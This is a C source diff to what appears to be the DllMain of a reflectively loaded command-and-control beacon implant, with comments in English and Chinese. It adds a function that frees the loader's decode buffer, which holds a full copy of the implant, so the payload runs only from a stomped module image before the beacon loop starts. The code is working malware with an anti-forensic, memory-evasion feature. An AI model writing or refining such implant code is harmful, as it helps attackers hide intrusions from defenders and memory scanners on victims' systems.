@@ -25,6 +25,48 @@ static void settings_init_once(HINSTANCE hinstDLL) {
 	}
 }
 
+/* P4: release the artifact container's decode buffer. Our UDRL passes a
+ * handoff struct (magic 'BWCF' + allocation base) as the reason-4
+ * parameter: by the time DllMain runs we execute from the stomped image
+ * and the loader's code in the container allocation is dead, so the full
+ * PE copy it still holds can go. Guards: the magic, a committed PRIVATE
+ * region, and not inside our own image - a wrong or foreign parameter is
+ * ignored (legacy callers pass anything, including NULL). */
+static void container_release(LPVOID lpReserved) {
+	struct { DWORD magic; void *alloc; } *ho = (struct { DWORD magic; void *alloc; } *)lpReserved;
+	MEMORY_BASIC_INFORMATION mbi;
+	unsigned char *img, *img_end;
+
+	if (ho == NULL)
+		return;
+	/* legacy callers pass arbitrary parameters - probe before reading */
+	if (!VirtualQuery(ho, &mbi, sizeof(mbi)) || mbi.State != MEM_COMMIT)
+		return;
+	if (ho->magic != 0x46435742UL || ho->alloc == NULL)
+		return;
+	if (!VirtualQuery(ho->alloc, &mbi, sizeof(mbi)))
+		return;
+	if (mbi.State != MEM_COMMIT || mbi.Type != MEM_PRIVATE)
+		return;
+	/* never free anything overlapping the image we are running from */
+	img = (unsigned char *)hAppInstance;
+	img_end = NULL;
+	if (img != NULL) {
+		DWORD lfanew = *(DWORD *)(img + 0x3C);
+		if (lfanew < 0x1000 && *(DWORD *)(img + lfanew) == 0x00004550) {
+			DWORD soi = *(DWORD *)(img + lfanew + 24 + 0x38);
+			img_end = img + soi;
+		}
+	}
+	if ((unsigned char *)mbi.AllocationBase < img_end &&
+	    (unsigned char *)mbi.AllocationBase + mbi.RegionSize > img)
+		return;
+	VirtualFree(ho->alloc, 0, MEM_RELEASE);
+	/* one-shot: scrub so a repeated reason-4 cannot double-free */
+	ho->magic = 0;
+	ho->alloc = NULL;
+}
+
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 	MEMORY_BASIC_INFORMATION mbi;
 
@@ -46,7 +88,12 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 			   缺陷返回，显式结束线程，杜绝跌落。 */
 			settings_init_once(hinstDLL);
 
-			/* clean up our loader */
+			/* P4: drop the container's decode buffer (full PE copy of us)
+			   before the beacon loop starts - see container_release() */
+			container_release(lpReserved);
+
+			/* clean up our loader（legacy 非映像加载路径：CLEANUP=1 且镜像为
+			   VirtualAlloc 私有内存时释放自身；映像-backed 路径 CLEANUP=0） */
 			if (setting_short(SETTING_CLEANUP) == 1 && hinstDLL != NULL) {
 				/* we don't want to crash, so let's look into the type of memory we have */
 				if (VirtualQuery((char *)hinstDLL, &mbi, sizeof(MEMORY_BASIC_INFORMATION))) {
